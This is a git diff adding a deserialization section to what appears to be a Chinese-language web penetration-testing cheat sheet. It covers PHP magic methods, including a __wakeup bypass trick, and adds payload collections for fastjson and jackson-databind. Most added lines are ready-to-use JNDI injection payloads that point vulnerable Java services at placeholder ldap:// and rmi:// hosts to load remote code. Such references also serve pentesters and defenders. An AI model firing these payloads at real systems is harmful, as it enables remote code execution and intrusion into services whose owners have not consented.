@@ -51,8 +51,10 @@
 		* [rsync_未授权访问漏洞](#rsync_未授权访问漏洞)
 		* [CRLF_HTTP头注人](#CRLF_HTTP头注人)
 		* [HPP_参数污染漏洞](#HPP_参数污染漏洞)
-		
-		
+		* [反序列化漏洞](#反序列化漏洞)
+			* [php反序列化](#php反序列化)
+			* [fastjson反序列化](#fastjson反序列化)
+			* [jackson_databind反序列化](#jackson_databind反序列化)
 				
 ## 信息收集
 
@@ -737,4 +739,78 @@ https://www.example.com/info.php?action=view&par=12345
 https://www.example.com/info.php?action=view&par=12345?&action=edit
 
 ```
+### 反序列化漏洞
 
+#### php反序列化
+> **php常见魔法函数**
+```
+__wakeup() 
+//使用unserialize时触发,需要绕过时可增加属性的值如：由O:4:"Demo":1:{s:4:"file";s:8:"flag.php";}修改为O:4:"Demo":9999:{s:4:"file";s:8:"flag.php";}
+
+__sleep() 
+//使用serialize时触发，如$s = serialize($obj); obj对象被序列化时将优先调用__sleep()方法
+
+__destruct() 
+//脚本运行结束后_destruct函数被触发
+
+__construct() 
+//类一执行就开始调用，其作用是拿来初始化一些值。
+
+__call() 
+//在对象上下文中调用不可访问的函数时触发，如：类中的函数调用不存在的函数时而调用__call()
+
+__callStatic() //在静态上下文中调用不可访问的方法时触发
+__get() //用于从不可访问的属性读取数据
+__set() //用于将数据写入不可访问的属性
+__isset() //在不可访问的属性上调用isset()或empty()触发
+__unset() //在不可访问的属性上使用unset()时触发
+
+__toString() 
+//把类当作字符串使用时触发，如用户可控：echo unserialize($_GET['usr_serialized']);首先会被反序列化，先调用了__wakeup()方法，之后被反序列化出来的对象又被当做字符串输出，又调用了__toString()方法，所以总共调用了两次魔法函数。
+
+__invoke() 
+//以调用函数的方式调用一个对象时__invoke()方法会被自动调用，如：$obj = new class(); 以$obj()这种函数形式调用时将调用__invoke()方法
+```
+#### fastjson反序列化
+> **fastjson反序列化payload集合**
+```
+{"@type": "com.sun.rowset.JdbcRowSetImpl","dataSourceName": "ldap://fastjson_1.2.24.localhost/fastjson_1.2.24", "autoCommit": true}
+
+{"name": {"@type":"java.lang.Class","val": "com.sun.rowset.JdbcRowSetImpl"},"x": {"@type": "com.sun.rowset.JdbcRowSetImpl","dataSourceName": rmi://fastjson_1.2.47.localhost/fastjson_1.2.47","autoCommit": true}}}
+
+{"@type": "org.apache.xbean.propertyeditor.JndiConverter","AsText": "rmi://fastjson_1.2.62.localhost/fastjson_1.2.62"}
+
+{"@type": "oracle.jdbc.connector.OracleManagedConnectionFactory ","dataSourceName": "rmi://fastjson_1.2.62_2.localhost/fastjson_1.2.62_2"}
+
+{"@type": "com.caucho.config.types.ResourceRef", "lookupName": "ldap://jackson_fastjson_10673.localhost/jackson_fastjson_10673"}
+
+{"@type":"com.zaxxer.hikari.HikariConfig","metricRegistry":"ldap://jackson_fastjson_14540.localhost/jackson_fastjson_14540"}
+
+// 基于spring框架的field
+{"@type": "org.springframework.beans.factory.config.PropertyPathFactoryBean","targetBeanName": "rmi://localhost/Exploit","propertyPath": "foo","beanFactory": {"@type": "org.springframework.jndi.support.SimpleJndiBeanFactory","shareableResources": ["rmi://spring_field.localhost/spring_field"]}}
+
+// 基于JndiRefForwardingDataSource
+{"@type": "com.mchange.v2.c3p0.JndiRefForwardingDataSource","jndiName": "rmi://JndiRefForwardingDataSource.localhost/JndiRefForwardingDataSource","loginTimeout": 0}
+
+// 基于JndiDataSourceFactoryDataSource
+{"@type": "org.apache.ibatis.datasource.jndi.JndiDataSourceFactory","properties": {"data_source": "rmi://JndiDataSourceFactory.localhost/JndiDataSourceFactory"}}
+
+// 基于StatisticsService
+{"@type": "org.hibernate.jmx.StatisticsService","SessionFactoryJNDIName": "rmi://StatisticsService.localhost/StatisticsService"}
+
+```
+#### jackson_databind反序列化
+> **jackson_databind反序列化payload集合**
+```
+{"param": ["com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig",{"properties": {"UserTransaction":"ldap://jackson_databind_9547.localhost/jackson_databind_9547"}}]}
+
+{"param": ["br.com.anteros.dbcp.AnterosDBCPConfig", {"healthCheckRegistry": "ldap://jackson_databind_9548.localhost/jackson_databind_9548"}]}
+
+{"param": ["com.caucho.config.types.ResourceRef", {"lookupName": "ldap://jackson_databind_10673.localhost/jackson_databind_10673"}]}
+
+{"param": ["org.apache.openjpa.ee.WASRegistryManagedRuntime",{"registryName": "ldap://jackson_databind_11113.localhost/jackson_databind_11113"}]}
+
+param=["ch.qos.logback.core.db.JNDIConnectionSource", {"jndiLocation": "rmi://jackson_databind_12834.localhost/jackson_databind_12834"}]
+
+{"param": ["org.springframework.context.support.FileSystemXmlApplicationContext","http://jackson_databind_7525.localhost/jackson_databind_7525"]}
+```
